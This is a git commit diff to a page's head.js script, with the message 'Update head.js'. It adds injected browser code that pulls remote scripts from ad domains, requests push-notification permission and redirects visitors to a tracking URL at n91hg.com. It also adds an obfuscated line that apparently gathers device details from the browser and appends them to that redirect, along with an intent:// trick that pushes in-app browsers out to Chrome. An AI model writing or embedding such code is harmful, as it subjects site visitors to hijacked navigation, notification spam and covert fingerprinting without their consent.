478294c2e6bca45180a6c41feb366cd6c4c63114
Izul Wahidin <izulwahidin@priv8.eu.org>
2025-08-09 20:51:12 +0800

    Update head.js

--- head.js
+++ head.js
@@ -1,7 +1,10 @@
 <script>
   var url = new URL(window.location.href);
-  var pci = url.host;
+  var pci = url.host.replace(/^try\d+\./, '');
   var ppi = pci;
+  var trafficbackURL = "https://n91hg.com/4/5478606/?var="+ppi+"&ymid="+pci;
+</script>
+<script>
   var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
   var s = document.createElement('script');
   s.src='//vuzismoothie.net/225/2af90/mw.min.js?z=9569878'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-73b04.js'+'&nouns=1';
@@ -10,13 +13,13 @@
           case 'onPermissionDefault':
           window.location.reload();break;
           case 'onPermissionAllowed':
-          Replace("//n91hg.com/4/5478606?var="+ppi+"&ymid="+pci);break;
+          Replace(trafficbackURL);break;
           case 'onPermissionDenied':
           handleRedirect();break;
           case 'onAlreadySubscribed':
-          Replace("//n91hg.com/4/5478606?var="+ppi+"&ymid="+pci);break;
+          Replace(trafficbackURL);break;
           case 'onNotificationUnsupported':
-          Replace("//n91hg.com/4/5478606?var="+ppi+"&ymid="+pci);break;
+          Replace(trafficbackURL);break;
       }
   };
   document.head.appendChild(s);
@@ -28,9 +31,6 @@
 <script async src="https://desenteir.com/225/2af90/reverse.min.js?sf=1"></script>
 
 <script>
-  var url = new URL(window.location.href);
-  var pci = url.host;
-  var ppi = url.host;
   function isInApp() {
       const regex = new RegExp(`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))`, 'ig');
       return Boolean(navigator.userAgent.match(regex));
@@ -39,7 +39,6 @@
   function initInappRd() {
       var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
       var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
-      var trafficbackURL = "https://n91hg.com/4/5478606/?var="+ppi+"&ymid="+pci;
       var ua = navigator.userAgent.toLowerCase();
   
       if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
